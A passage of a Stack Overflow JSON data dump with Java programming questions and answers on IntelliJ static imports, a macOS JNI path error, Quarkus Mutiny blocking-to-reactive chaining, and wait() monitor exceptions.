on the class name (ie Math), press alt+enter and choose \"add on demand static import for 'java.lang.Math'. Intellij will add</p>\n\n<pre><code>import static java.lang.Math.*;\n</code></pre>\n\n<p>to the top of the file.</p>\n"},{"tags":[],"owner":{"account_id":19462,"reputation":102762,"user_id":45664,"accept_rate":91,"display_name":"Andrzej Doyle"},"down_vote_count":2,"up_vote_count":70,"is_accepted":true,"score":68,"last_activity_date":1683727473,"creation_date":1291810014,"answer_id":4387218,"question_id":4387134,"body_markdown":"# Version &gt;= 2021.x\r\n`Settings -&gt; Editor -&gt; Code Style -&gt; Java -&gt; Imports (tab)`.\r\n# Version &gt;= 11:\r\n`Settings -&gt; Code Style -&gt; Java -&gt; Imports (tab)`.\r\n# Version &lt; 11\r\n`Settings -&gt; Code Style -&gt; Imports`\r\n\r\nIn the middle of the pane is the &quot;Packages to Use Import with &#39;*&#39;&quot; table.  You can add an entry here of a fully-qualified class name, and tick the static box; now all static methods in this class will be available for auto-completion.\r\n\r\n(I&#39;m not sure how the static import works with specifying a package, as I&#39;ve never tried it, but I don&#39;t see why it wouldn&#39;t.  Specifying a super-package and ticking the &quot;with subpackages&quot; option could be even more interesting.)","title":"IntelliJ Static Import Completion","body":"<h1>Version &gt;= 2021.x</h1>\n<p><code>Settings -&gt; Editor -&gt; Code Style -&gt; Java -&gt; Imports (tab)</code>.</p>\n<h1>Version &gt;= 11:</h1>\n<p><code>Settings -&gt; Code Style -&gt; Java -&gt; Imports (tab)</code>.</p>\n<h1>Version &lt; 11</h1>\n<p><code>Settings -&gt; Code Style -&gt; Imports</code></p>\n<p>In the middle of the pane is the &quot;Packages to Use Import with '*'&quot; table.  You can add an entry here of a fully-qualified class name, and tick the static box; now all static methods in this class will be available for auto-completion.</p>\n<p>(I'm not sure how the static import works with specifying a package, as I've never tried it, but I don't see why it wouldn't.  Specifying a super-package and ticking the &quot;with subpackages&quot; option could be even more interesting.)</p>\n"},{"tags":[],"owner":{"account_id":208068,"reputation":2056,"user_id":458324,"display_name":"Pakka Pakka"},"down_vote_count":0,"up_vote_count":42,"is_accepted":false,"score":42,"last_activity_date":1400099708,"creation_date":1298738633,"answer_id":5128248,"question_id":4387134,"body_markdown":"If you&#39;re using IntelliJ 10, try the following:\r\n\r\n    assEq&lt;Ctrl-Alt-Space&gt;\r\n\r\nAccepting a suggestion from the resulting popup list will, by default, insert a ClassName.methodName() reference (which you can convert to a static import using an Alt-Enter intention).\r\n\r\nYou can also insert a statically imported method from the completion list by choosing &quot;Right&quot; in the completion menu, and selecting &quot;Import Statically&quot;:\r\n\r\n![enter image description here][1]\r\n\r\nNote that once you&#39;ve statically imported a single method from a class (Assert.assertSame), other static methods from that class (like Assert.assertEquals) will be included in the &quot;regular&quot; code completion (Ctrl-Space).\r\n\r\n\r\n  [1]: http://i.stack.imgur.com/uuCcR.png","title":"IntelliJ Static Import Completion","body":"<p>If you're using IntelliJ 10, try the following:</p>\n\n<pre><code>assEq&lt;Ctrl-Alt-Space&gt;\n</code></pre>\n\n<p>Accepting a suggestion from the resulting popup list will, by default, insert a ClassName.methodName() reference (which you can convert to a static import using an Alt-Enter intention).</p>\n\n<p>You can also insert a statically imported method from the completion list by choosing \"Right\" in the completion menu, and selecting \"Import Statically\":</p>\n\n<p><img src=\"https://i.stack.imgur.com/uuCcR.png\" alt=\"enter image description here\"></p>\n\n<p>Note that once you've statically imported a single method from a class (Assert.assertSame), other static methods from that class (like Assert.assertEquals) will be included in the \"regular\" code completion (Ctrl-Space).</p>\n"},{"tags":[],"owner":{"account_id":154559,"reputation":1436,"user_id":370576,"display_name":"loyalBrown"},"down_vote_count":0,"up_vote_count":40,"is_accepted":false,"score":40,"last_activity_date":1391397103,"creation_date":1390704395,"answer_id":21359016,"question_id":4387134,"body_markdown":"For Intellij 12 just hit `&lt;ctrl + spacebar(twice)&gt;`. Then to import the method statically hit `&lt;alt + return&gt;`. Otherwise just hitting enter will insert the fully qualified name of the method.\r\n\r\n**Update:**\r\nSometimes just using `&lt;alt + return&gt;` works too.","title":"IntelliJ Static Import Completion","body":"<p>For Intellij 12 just hit <code>&lt;ctrl + spacebar(twice)&gt;</code>. Then to import the method statically hit <code>&lt;alt + return&gt;</code>. Otherwise just hitting enter will insert the fully qualified name of the method.</p>\n\n<p><strong>Update:</strong>\nSometimes just using <code>&lt;alt + return&gt;</code> works too.</p>\n"},{"tags":[],"owner":{"account_id":6411961,"reputation":151,"user_id":4971434,"display_name":"John Dewell"},"down_vote_count":0,"up_vote_count":13,"is_accepted":false,"score":13,"last_activity_date":1433380761,"creation_date":1433371469,"answer_id":30632120,"question_id":4387134,"body_markdown":"In OS X you need to do a option + return.","title":"IntelliJ Static Import Completion","body":"<p>In OS X you need to do a option + return.</p>\n"},{"tags":[],"owner":{"account_id":344176,"reputation":2206,"user_id":676344,"accept_rate":43,"display_name":"nucatus"},"down_vote_count":0,"up_vote_count":85,"is_accepted":false,"score":85,"last_activity_date":1436388228,"creation_date":1436388228,"answer_id":31303325,"question_id":4387134,"body_markdown":"`Alt + Enter` will do the trick. You have to have the whole expression at first, and the hit `Alt + Enter` on the method you want to statically import.\r\n\r\n![statically import IntelliJ][1]\r\n\r\n\r\n  [1]: http://i.stack.imgur.com/bZUqE.png","title":"IntelliJ Static Import Completion","body":"<p><code>Alt + Enter</code> will do the trick. You have to have the whole expression at first, and the hit <code>Alt + Enter</code> on the method you want to statically import.</p>\n\n<p><img src=\"https://i.stack.imgur.com/bZUqE.png\" alt=\"statically import IntelliJ\"></p>\n"},{"tags":[],"owner":{"account_id":5418168,"reputation":1454,"user_id":4312720,"display_name":"Jorge Tovar"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1592498037,"creation_date":1592497639,"answer_id":62454784,"question_id":4387134,"body_markdown":"Now its possible to add **live templates** with **static imports**:\r\n&gt; You have to check static import in Options\r\n\r\n```java\r\n@org.junit.Test\r\npublic void should$EXPR$when$CONDITION$() {\r\n    org.junit.Assert.assertThat(null, org.hamcrest.CoreMatchers.is(org.hamcrest.CoreMatchers.nullValue())); \r\n}\r\n```\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/c0MP4.png","title":"IntelliJ Static Import Completion","body":"<p>Now its possible to add <strong>live templates</strong> with <strong>static imports</strong>:</p>\n\n<blockquote>\n  <p>You have to check static import in Options</p>\n</blockquote>\n\n<pre class=\"lang-java prettyprint-override\"><code>@org.junit.Test\npublic void should$EXPR$when$CONDITION$() {\n    org.junit.Assert.assertThat(null, org.hamcrest.CoreMatchers.is(org.hamcrest.CoreMatchers.nullValue())); \n}\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/c0MP4.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/c0MP4.png\" alt=\"enter image description here\"></a></p>\n"},{"tags":[],"owner":{"account_id":11570684,"reputation":1,"user_id":8477569,"display_name":"Ewa P"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1671793921,"creation_date":1671793854,"answer_id":74898991,"question_id":4387134,"body_markdown":"In IntelliJ 2022.3 on Mac, go to Preferences &gt; Code Style &gt; Java &gt; tab &#39;Imports&#39; &gt; section &#39;Packages to Use Import with &quot;*&quot; &gt; click &#39;+&#39; &gt; search for desired class &gt; hit Enter and tick the box next to the new entry to indicate it is static. ","title":"IntelliJ Static Import Completion","body":"<p>In IntelliJ 2022.3 on Mac, go to Preferences &gt; Code Style &gt; Java &gt; tab 'Imports' &gt; section 'Packages to Use Import with &quot;*&quot; &gt; click '+' &gt; search for desired class &gt; hit Enter and tick the box next to the new entry to indicate it is static.</p>\n"}],"owner":{"account_id":87886,"reputation":4994,"user_id":243456,"accept_rate":81,"display_name":"Scruffers"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":93229,"favorite_count":0,"down_vote_count":0,"up_vote_count":103,"accepted_answer_id":4387218,"answer_count":8,"score":103,"last_activity_date":1683727473,"creation_date":1291809419,"question_id":4387134,"body_markdown":"In Eclipse I was able to register a set of classes for static import auto-completion, e.g. Math.*, Assert.*, EasyMock.*\r\n\r\nWith this enabled I was able to hit ctrl-space assertEquals, pow, createMock etc. would appear as valid code completions.\r\n\r\nI&#39;m struggling to find this in IntelliJ but am sure it must exist. Can anyone help?\r\n\r\nThanks!","title":"IntelliJ Static Import Completion","body":"<p>In Eclipse I was able to register a set of classes for static import auto-completion, e.g. Math.<em>, Assert.</em>, EasyMock.*</p>\n\n<p>With this enabled I was able to hit ctrl-space assertEquals, pow, createMock etc. would appear as valid code completions.</p>\n\n<p>I'm struggling to find this in IntelliJ but am sure it must exist. Can anyone help?</p>\n\n<p>Thanks!</p>\n"},{"tags":["java","macos","vscode-debugger"],"answers":[{"tags":[],"owner":{"account_id":20618835,"reputation":31,"user_id":15136297,"display_name":"Philipp Kath&#246;fer"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1671614644,"creation_date":1671614644,"answer_id":74873798,"question_id":74277816,"body_markdown":"I also had this error, my problem was that the path where my .class file was in, had emojis in it. Try to put your .java file into the Documents folder, this worked for me. Check if your path doesn&#39;t contain any special characters such as emojis or characters like &#228;, &#246; and &#252;. Try to make your path purely alphanumerical.","title":"Java JNI Error in VS Code on MacOS Ventura","body":"<p>I also had this error, my problem was that the path where my .class file was in, had emojis in it. Try to put your .java file into the Documents folder, this worked for me. Check if your path doesn't contain any special characters such as emojis or characters like ä, ö and ü. Try to make your path purely alphanumerical.</p>\n"}],"owner":{"account_id":26786077,"reputation":1,"user_id":20380248,"display_name":"kjk10"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":923,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1683727273,"creation_date":1667314529,"question_id":74277816,"body_markdown":"To start learning Java on my MacOS I downloaded the Java SE Development Kit 19.0.1 from Oracle on my MacBook Pro 2018 running on Ventura.\r\nI then configured the Java Home Path according to some YT Videos.\r\nI also installed to Java Extension Pack from the Visual studio website.\r\n\r\nIn class we wrote a simple Hello World Java Program. Everytime I try to run a java program in vs code I keep getting a JNI error. I&#39;ve already checken whether my javac and java Versions are the same, both are 19.0.1\r\n\r\nThis is the error I keep getting:\r\n\r\n\r\n\r\n```\r\nError: A JNI error has occurred, please check your installation and try again\r\nException in thread &quot;main&quot; java.lang.IllegalArgumentException: Error decoding percent encoded characters\r\n        at java.base/sun.net.www.ParseUtil.decode(ParseUtil.java:218)\r\n        at java.base/jdk.internal.loader.FileURLMapper.getPath(FileURLMapper.java:64)\r\n        at java.base/jdk.internal.loader.FileURLMapper.exists(FileURLMapper.java:73)\r\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader.getJarFile(URLClassPath.java:826)\r\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader$1.run(URLClassPath.java:771)\r\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader$1.run(URLClassPath.java:765)\r\n        at java.base/java.security.AccessController.doPrivileged(AccessController.java:712)\r\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader.ensureOpen(URLClassPath.java:764)\r\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader.&lt;init&gt;(URLClassPath.java:738)\r\n        at java.base/jdk.internal.loader.URLClassPath$3.run(URLClassPath.java:502)\r\n        at java.base/jdk.internal.loader.URLClassPath$3.run(URLClassPath.java:485)\r\n        at java.base/java.security.AccessController.doPrivileged(AccessController.java:712)\r\n        at java.base/jdk.internal.loader.URLClassPath.getLoader(URLClassPath.java:484)\r\n        at java.base/jdk.internal.loader.URLClassPath.getLoader(URLClassPath.java:452)\r\n        at java.base/jdk.internal.loader.URLClassPath.getResource(URLClassPath.java:321)\r\n        at java.base/jdk.internal.loader.BuiltinClassLoader.findClassOnClassPathOrNull(BuiltinClassLoader.java:757)\r\n        at java.base/jdk.internal.loader.BuiltinClassLoader.loadClassOrNull(BuiltinClassLoader.java:681)\r\n        at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:639)\r\n        at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:188)\r\n        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:521)\r\n        at java.base/java.lang.Class.forName0(Native Method)\r\n        at java.base/java.lang.Class.forName(Class.java:495)\r\n        at java.base/java.lang.Class.forName(Class.java:474)\r\n        at java.base/sun.launcher.LauncherHelper.loadMainClass(LauncherHelper.java:790)\r\n        at java.base/sun.launcher.LauncherHelper.checkAndLoadMain(LauncherHelper.java:685)\r\n```\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nBefore I installed the JDK from Oracle vs code suggested a link for a JDK that I&#39;d previously installed: Basically the Eclipse Temurin JDK.\r\n\r\nI thought that maybe they had clashed. I delete the temurin jdk, but I still keep getting the error. (Maybe it&#39;s not entirely deleted, I had to search it with the Terminal because Finder wouldn&#39;t show me where it was)\r\n\r\nDeleted the temurin in the Terminal this way:\r\nsudo rm -r temurin-11.jdk\r\n\r\n\r\nThis is the Java Version I have:\r\njava version &quot;19.0.1&quot; 2022-10-18\r\nJava(TM) SE Runtime Environment (build 19.0.1+10-21)\r\nJava HotSpot(TM) 64-Bit Server VM (build 19.0.1+10-21, mixed mode, sharing)\r\n\r\nThis is the Javac Version:\r\njavac 19.0.1\r\n\r\nWhat I did to configure Java_HOME variable:\r\n\r\n$echo $JAVA_HOME\r\n$/usr/libexec/java_home\r\nOutput: zsh: no such file or directory: $/usr/libexec/java_home\r\n/usr/libexec/java_home\r\nOutput: /Library/Java/JavaVirtualMachines/jdk-19.jdk/Contents/Home\r\necho $SHELL\r\nOutput: /bin/zsh\r\ntouch ~/.zshenv\r\nopen ~/.zshenv\r\nsource ~/.zshenv\r\necho $JAVA_HOME\r\nOutput: /Library/Java/JavaVirtualMachines/jdk-19.jdk/Contents/Home\r\n\r\n\r\n\r\n\r\nI&#39;ve tried running the some of the Codes we&#39;ve been provided in class on the linux computers of the our Institute, they work perfectly fine there.\r\n\r\nExample of Code:\r\n\r\n\r\n```\r\npublic class Testen {   \r\n    public static void main( String[] args){ \r\n        int a = Integer.parseInt(args[0]);\r\n\r\n\tSystem.out.println(a);\r\n    }\r\n}\r\n\r\n```\r\nAnother Example:\r\n\r\n```\r\npublic class HelloWorld {\r\n    public static void main (String[] args){\r\n        System.out.println(&quot;Hello, world!&quot;); //dies ist eine Anweisung, also wie im Shell ein KOmmando\r\n    }\r\n} /* Dieses Programm gibt eine Begr&#252;&#223;ung aus und endet  */\r\n\r\n```\r\n\r\n\r\nAny Program I Run gives me a JNI error.\r\n\r\n\r\n\r\n\r\n\r\n\r\n","title":"Java JNI Error in VS Code on MacOS Ventura","body":"<p>To start learning Java on my MacOS I downloaded the Java SE Development Kit 19.0.1 from Oracle on my MacBook Pro 2018 running on Ventura.\nI then configured the Java Home Path according to some YT Videos.\nI also installed to Java Extension Pack from the Visual studio website.</p>\n<p>In class we wrote a simple Hello World Java Program. Everytime I try to run a java program in vs code I keep getting a JNI error. I've already checken whether my javac and java Versions are the same, both are 19.0.1</p>\n<p>This is the error I keep getting:</p>\n<pre><code>Error: A JNI error has occurred, please check your installation and try again\nException in thread &quot;main&quot; java.lang.IllegalArgumentException: Error decoding percent encoded characters\n        at java.base/sun.net.www.ParseUtil.decode(ParseUtil.java:218)\n        at java.base/jdk.internal.loader.FileURLMapper.getPath(FileURLMapper.java:64)\n        at java.base/jdk.internal.loader.FileURLMapper.exists(FileURLMapper.java:73)\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader.getJarFile(URLClassPath.java:826)\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader$1.run(URLClassPath.java:771)\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader$1.run(URLClassPath.java:765)\n        at java.base/java.security.AccessController.doPrivileged(AccessController.java:712)\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader.ensureOpen(URLClassPath.java:764)\n        at java.base/jdk.internal.loader.URLClassPath$JarLoader.&lt;init&gt;(URLClassPath.java:738)\n        at java.base/jdk.internal.loader.URLClassPath$3.run(URLClassPath.java:502)\n        at java.base/jdk.internal.loader.URLClassPath$3.run(URLClassPath.java:485)\n        at java.base/java.security.AccessController.doPrivileged(AccessController.java:712)\n        at java.base/jdk.internal.loader.URLClassPath.getLoader(URLClassPath.java:484)\n        at java.base/jdk.internal.loader.URLClassPath.getLoader(URLClassPath.java:452)\n        at java.base/jdk.internal.loader.URLClassPath.getResource(URLClassPath.java:321)\n        at java.base/jdk.internal.loader.BuiltinClassLoader.findClassOnClassPathOrNull(BuiltinClassLoader.java:757)\n        at java.base/jdk.internal.loader.BuiltinClassLoader.loadClassOrNull(BuiltinClassLoader.java:681)\n        at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:639)\n        at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:188)\n        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:521)\n        at java.base/java.lang.Class.forName0(Native Method)\n        at java.base/java.lang.Class.forName(Class.java:495)\n        at java.base/java.lang.Class.forName(Class.java:474)\n        at java.base/sun.launcher.LauncherHelper.loadMainClass(LauncherHelper.java:790)\n        at java.base/sun.launcher.LauncherHelper.checkAndLoadMain(LauncherHelper.java:685)\n</code></pre>\n<p>Before I installed the JDK from Oracle vs code suggested a link for a JDK that I'd previously installed: Basically the Eclipse Temurin JDK.</p>\n<p>I thought that maybe they had clashed. I delete the temurin jdk, but I still keep getting the error. (Maybe it's not entirely deleted, I had to search it with the Terminal because Finder wouldn't show me where it was)</p>\n<p>Deleted the temurin in the Terminal this way:\nsudo rm -r temurin-11.jdk</p>\n<p>This is the Java Version I have:\njava version &quot;19.0.1&quot; 2022-10-18\nJava(TM) SE Runtime Environment (build 19.0.1+10-21)\nJava HotSpot(TM) 64-Bit Server VM (build 19.0.1+10-21, mixed mode, sharing)</p>\n<p>This is the Javac Version:\njavac 19.0.1</p>\n<p>What I did to configure Java_HOME variable:</p>\n<p>$echo $JAVA_HOME\n$/usr/libexec/java_home\nOutput: zsh: no such file or directory: $/usr/libexec/java_home\n/usr/libexec/java_home\nOutput: /Library/Java/JavaVirtualMachines/jdk-19.jdk/Contents/Home\necho $SHELL\nOutput: /bin/zsh\ntouch ~/.zshenv\nopen ~/.zshenv\nsource ~/.zshenv\necho $JAVA_HOME\nOutput: /Library/Java/JavaVirtualMachines/jdk-19.jdk/Contents/Home</p>\n<p>I've tried running the some of the Codes we've been provided in class on the linux computers of the our Institute, they work perfectly fine there.</p>\n<p>Example of Code:</p>\n<pre><code>public class Testen {   \n    public static void main( String[] args){ \n        int a = Integer.parseInt(args[0]);\n\n    System.out.println(a);\n    }\n}\n\n</code></pre>\n<p>Another Example:</p>\n<pre><code>public class HelloWorld {\n    public static void main (String[] args){\n        System.out.println(&quot;Hello, world!&quot;); //dies ist eine Anweisung, also wie im Shell ein KOmmando\n    }\n} /* Dieses Programm gibt eine Begrüßung aus und endet  */\n\n</code></pre>\n<p>Any Program I Run gives me a JNI error.</p>\n"},{"tags":["java","quarkus","mutiny","smallrye"],"comments":[{"owner":{"account_id":1276303,"reputation":2937,"user_id":1231484,"display_name":"Clement"},"score":0,"creation_date":1683534301,"post_id":76198665,"comment_id":134375872,"body_markdown":"I need more detail. First, you return a Multi, while subscribing to the method (hint: never subscribe yourself, only 1% of the use case requires that). Also, `Uni.createFrom() has always returned a `UniCreate` instance. What is the return type of `this.invokeRemoteServiceUsingReactive(myResponseUni);` and `invokeRemoteServiceUsingBlockingIO` ??","body":"I need more detail. First, you return a Multi, while subscribing to the method (hint: never subscribe yourself, only 1% of the use case requires that). Also, <code>Uni.createFrom() has always returned a </code>UniCreate` instance. What is the return type of <code>this.invokeRemoteServiceUsingReactive(myResponseUni);</code> and <code>invokeRemoteServiceUsingBlockingIO</code> ??"},{"owner":{"account_id":945173,"reputation":962,"user_id":1167759,"display_name":"Niklas Heidloff"},"score":0,"creation_date":1683538149,"post_id":76198665,"comment_id":134376648,"body_markdown":"Thanks Clement!\nI used runSubscriptionOn because the doc suggests it.\nthis.invokeRemoteServiceUsingReactive(myResponseUni) returns Multi&lt;MyReponseMulti&gt;; this.invokeRemoteServiceUsingBlockingIO(query) returns MyReponseUni.","body":"Thanks Clement! I used runSubscriptionOn because the doc suggests it. this.invokeRemoteServiceUsingReactive(myResponseUni) returns Multi&lt;MyReponseMulti&gt;; this.invokeRemoteServiceUsingBlockingIO(query) returns MyReponseUni."},{"owner":{"account_id":1276303,"reputation":2937,"user_id":1231484,"display_name":"Clement"},"score":0,"creation_date":1683634893,"post_id":76198665,"comment_id":134393946,"body_markdown":"I still don&#39;t understand. In your code snippet you return a Multi (in the signature) but the code seems to only use Uni. Can you describe what you are trying to achieve? The runSubscriptionOn is correct if the supplier is blocking. So, maybe what you want is `Multi.createFrom().deferred(() -&gt; ... )`","body":"I still don&#39;t understand. In your code snippet you return a Multi (in the signature) but the code seems to only use Uni. Can you describe what you are trying to achieve? The runSubscriptionOn is correct if the supplier is blocking. So, maybe what you want is <code>Multi.createFrom().deferred(() -&gt; ... )</code>"},{"owner":{"account_id":945173,"reputation":962,"user_id":1167759,"display_name":"Niklas Heidloff"},"score":0,"creation_date":1683709973,"post_id":76198665,"comment_id":134406843,"body_markdown":"Thanks Clement, I want to return Server Sent Events to an API client which returns Multi&lt;OutboundSseEvent&gt; based on Multi&lt;MyReponseMulti&gt;. This works nicely if I only call this non blocking code. However, before I run the reactive code I need to invoke a blocking operation invokeRemoteServiceUsingBlockingIO. The output of the blocking operation is the input of the reactive operation. I would think this is a typical scenario. Would be great if you could help!","body":"Thanks Clement, I want to return Server Sent Events to an API client which returns Multi&lt;OutboundSseEvent&gt; based on Multi&lt;MyReponseMulti&gt;. This works nicely if I only call this non blocking code. However, before I run the reactive code I need to invoke a blocking operation invokeRemoteServiceUsingBlockingIO. The output of the blocking operation is the input of the reactive operation. I would think this is a typical scenario. Would be great if you could help!"},{"owner":{"account_id":945173,"reputation":962,"user_id":1167759,"display_name":"Niklas Heidloff"},"score":0,"creation_date":1683711477,"post_id":76198665,"comment_id":134407208,"body_markdown":"Here is my current attempt: https://github.com/nheidloff/question-answering/blob/56fe86c0474720f9fb39f9619baa8e735de5b022/service/src/main/java/com/ibm/question_answering/QueryDiscoveryMaaS.java#L42","body":"Here is my current attempt: <a href=\"https://github.com/nheidloff/question-answering/blob/56fe86c0474720f9fb39f9619baa8e735de5b022/service/src/main/java/com/ibm/question_answering/QueryDiscoveryMaaS.java#L42\" rel=\"nofollow noreferrer\">github.com/nheidloff/question-answering/blob/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":1276303,"reputation":2937,"user_id":1231484,"display_name":"Clement"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1683727151,"creation_date":1683727151,"answer_id":76219322,"question_id":76198665,"body_markdown":"I believe you need something like this:\r\n\r\n```java\r\npublic Multi&lt;MyReponseMulti&gt; queryAsStream(String query) {\r\n    // First, create a Uni for the blocking operation\r\n    var blockingOp = Uni.createFrom().item(() -&gt; {\r\n      return this.invokeRemoteServiceUsingBlockingIO(query);\r\n    }).runSubscriptionOn(Infrastructure.getDefaultWorkerPool());\r\n    // Now, transform the outcome of this uni to the Multi \r\n    return blockingOp\r\n       .onItem().transformToMulti(myResponseUni -&gt; {\r\n            // I guess this method returns a Multi\r\n            return this.invokeRemoteServiceUsingReactive(myResponseUni);\r\n        });\r\n}\r\n```","title":"How to invoke asynch Operations after synch Operations with Quarkus Smallrye Mutiny?","body":"<p>I believe you need something like this:</p>\n<pre class=\"lang-java prettyprint-override\"><code>public Multi&lt;MyReponseMulti&gt; queryAsStream(String query) {\n    // First, create a Uni for the blocking operation\n    var blockingOp = Uni.createFrom().item(() -&gt; {\n      return this.invokeRemoteServiceUsingBlockingIO(query);\n    }).runSubscriptionOn(Infrastructure.getDefaultWorkerPool());\n    // Now, transform the outcome of this uni to the Multi \n    return blockingOp\n       .onItem().transformToMulti(myResponseUni -&gt; {\n            // I guess this method returns a Multi\n            return this.invokeRemoteServiceUsingReactive(myResponseUni);\n        });\n}\n</code></pre>\n"}],"owner":{"account_id":945173,"reputation":962,"user_id":1167759,"display_name":"Niklas Heidloff"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":245,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":76219322,"answer_count":1,"score":0,"last_activity_date":1683727151,"creation_date":1683533814,"question_id":76198665,"body_markdown":"I need to run some synchronous code followed by asynchronous code in Quarkus. The documentation sounds promising https://smallrye.io/smallrye-mutiny/2.2.0/guides/imperative-to-reactive/, but it seems to be dated since Uni.createFrom() doesn&#39;t return a Uni but an UniCreate object and some method names seem to have changed since the recording of the Quarkus Insights talk.\r\n\r\nI&#39;ve tried several variations without success. It sounds like the method &#39;transform&#39; could help, but I haven&#39;t found samples how to use it in this context. Other options return &quot;thread must not be blocked&quot;.\r\n\r\nI&#39;m looking for something like this:\r\n\r\n    public Multi&lt;MyReponseMulti&gt; queryAsStream(String query) {\r\n        return Uni.createFrom().\r\n            item(() -&gt; {\r\n                MyReponseUni myResponseUni = this.invokeRemoteServiceUsingBlockingIO(query);\r\n                return this.invokeRemoteServiceUsingReactive(myResponseUni);\r\n            });\r\n            .runSubscriptionOn(Infrastructure.getDefaultWorkerPool())\r\n            .subscribe().asCompletionStage();\r\n    }\r\n\r\nRight now the code above has a compilation error:\r\n\r\n    Type mismatch: cannot convert from CompletableFuture&lt;Multi&lt;MyReponseMulti&gt;&gt; to Multi&lt;MyReponseMulti&gt;\r\n\r\nCould someone please help? Thanks!","title":"How to invoke asynch Operations after synch Operations with Quarkus Smallrye Mutiny?","body":"<p>I need to run some synchronous code followed by asynchronous code in Quarkus. The documentation sounds promising <a href=\"https://smallrye.io/smallrye-mutiny/2.2.0/guides/imperative-to-reactive/\" rel=\"nofollow noreferrer\">https://smallrye.io/smallrye-mutiny/2.2.0/guides/imperative-to-reactive/</a>, but it seems to be dated since Uni.createFrom() doesn't return a Uni but an UniCreate object and some method names seem to have changed since the recording of the Quarkus Insights talk.</p>\n<p>I've tried several variations without success. It sounds like the method 'transform' could help, but I haven't found samples how to use it in this context. Other options return &quot;thread must not be blocked&quot;.</p>\n<p>I'm looking for something like this:</p>\n<pre><code>public Multi&lt;MyReponseMulti&gt; queryAsStream(String query) {\n    return Uni.createFrom().\n        item(() -&gt; {\n            MyReponseUni myResponseUni = this.invokeRemoteServiceUsingBlockingIO(query);\n            return this.invokeRemoteServiceUsingReactive(myResponseUni);\n        });\n        .runSubscriptionOn(Infrastructure.getDefaultWorkerPool())\n        .subscribe().asCompletionStage();\n}\n</code></pre>\n<p>Right now the code above has a compilation error:</p>\n<pre><code>Type mismatch: cannot convert from CompletableFuture&lt;Multi&lt;MyReponseMulti&gt;&gt; to Multi&lt;MyReponseMulti&gt;\n</code></pre>\n<p>Could someone please help? Thanks!</p>\n"},{"tags":["java","multithreading","try-catch","wait"],"comments":[{"owner":{"account_id":26721880,"reputation":258,"user_id":20325571,"display_name":"Maxime Baker"},"score":1,"creation_date":1683574699,"post_id":76203740,"comment_id":134384752,"body_markdown":"Did you try the solution provided here : https://stackoverflow.com/a/30262285/20325571 ?","body":"Did you try the solution provided here : <a href=\"https://stackoverflow.com/a/30262285/20325571\">stackoverflow.com/a/30262285/20325571</a> ?"},{"owner":{"account_id":22057425,"reputation":135,"user_id":16320675,"display_name":"user16320675"},"score":1,"creation_date":1683577728,"post_id":76203740,"comment_id":134385309,"body_markdown":"what are you trying to accomplish? 1: make the current thread stop for a given time, that is,  `Thread.sleep(2000)`; or 2: wait for `t` to terminate, that would be `t.join(2000)` (but `t` was not even started...); or 3: really wait until `t.notify()` is called, then you need to move the `wait()` call inside a `synchronized (t)` block (not the best practice)","body":"what are you trying to accomplish? 1: make the current thread stop for a given time, that is,  <code>Thread.sleep(2000)</code>; or 2: wait for <code>t</code> to terminate, that would be <code>t.join(2000)</code> (but <code>t</code> was not even started...); or 3: really wait until <code>t.notify()</code> is called, then you need to move the <code>wait()</code> call inside a <code>synchronized (t)</code> block (not the best practice)"}],"answers":[{"tags":[],"owner":{"account_id":2048586,"reputation":840,"user_id":1828105,"display_name":"Hasasn"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1683727125,"creation_date":1683577591,"answer_id":76204142,"question_id":76203740,"body_markdown":"The thread that you have created, has never been started. I think you should so something like this:\r\n\r\n```java\r\nThread t = new Thread(new Runnable() {\r\n    @Override\r\n    public void run() {\r\n        try {\r\n            this.wait(2000);\r\n        } catch (InterruptedException e) {\r\n            throw new RuntimeException(e);\r\n        }\r\n    }\r\n});\r\n\r\nt.start();\r\n```","title":"Java Error: Exception in thread &quot;main&quot; java.lang.IllegalMonitorStateException: current thread is not owner","body":"<p>The thread that you have created, has never been started. I think you should so something like this:</p>\n<pre class=\"lang-java prettyprint-override\"><code>Thread t = new Thread(new Runnable() {\n    @Override\n    public void run() {\n        try {\n            this.wait(2000);\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n});\n\nt.start();\n</code></pre>\n"},{"tags":[],"owner":{"account_id":401843,"reputation":89768,"user_id":768644,"display_name":"rzwitserloot"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1683580098,"creation_date":1683580098,"answer_id":76204363,"question_id":76203740,"body_markdown":"`wait` is a low-level construct 